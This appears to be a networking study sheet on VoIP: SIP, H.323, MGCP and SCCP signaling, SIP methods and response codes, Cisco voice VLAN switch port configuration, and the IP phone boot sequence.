Signaling Protocols
ITU-T H.323
	Originally designed for multimedia transmission over ISDN; mature and widely supported; peer-to-peer call control
Session Initiation Protocol (SIP)
	Text-based, similar in nature to HTTP; defined in RFC 3261; peer-to-peer call control
Media Gateway Control Protocol (MGCP)
	Employs centralized call control; defined in RFC 3661
Skinny Client Control Protocol (SCCP)
	Cisco-proprietary; limited support on gateways; centralized control

SIP
port 5060 tcp udp -unencrypted
port 5061 TLS
	--ASCII-based
	--request-response model
	--SIP client request is made using a SIP URI a user agent and a method/request
	--address format: user/phone@domain/ip

SIP Requests/Methods
INVITE		Used to invite and account to participate in a call session.
ACK			Acknowledge an INVITE request.
CANCEL		Cancel a pending request.
REGISTER	Register user with a SIP server.
OPTIONS		Lists information about the capabilities of a caller.
BYE			Terminates a session between two users in a call.
REFER		Indicates that the recipient(identified by the Request URI) should contact a third party using the contact information provided in the request.
SUBSCRIBE	The SUBSCRIBE method is used to request current state and state updates from a remote node.
NOTIFY		The NOTIFY method is used to notify a SIP node that an event which has been requested by an earlier SUBSCRIBE method has occurred.

SIP Responses
1xx			Informational responses, Request received and being
2xx			Successful responses The action was successfully received, understood, and accepted.
3xx			Redirection responses
4xx			Request failure responses The request contains bad syntax or cannot be fulfilled at the server.
5xx			Server failure responses The server failed to fulfill an apparently valid request.
6xx			Global failure responses The request cannot be fulfilled at any	server.

Access Switch Port Configuration
interface FastEthernet0/1
switchport access vlan <VLAN>
switchport voice vlan <VLAN>
	-configure data and voice access VLANs
mls qos trust cos
	-trust ingress QoS markings
power inline static [max <wattage>]
	-pre-allocate power for the port

IP Phone Boot Process
1. Power Over Ethernet (Optional)
	Power is supplied via IEEE 802.3af/at or Cisco ILP
2. VLANs Learned via CDP or LLDP
	Voice and data VLANs communicated via CDP/LLDP
3. IP Assignment via DHCP
	The phone sends a DHCP request in the voice VLAN; the response includes an IP and DHCP option 150
4. Configuration Retrieved via TFTP
	The phone retrieves its configuration from one of the TFTP servers specified in the DHCP option
5. Registration
	The phone registers with the call server(s) specified in its configuration
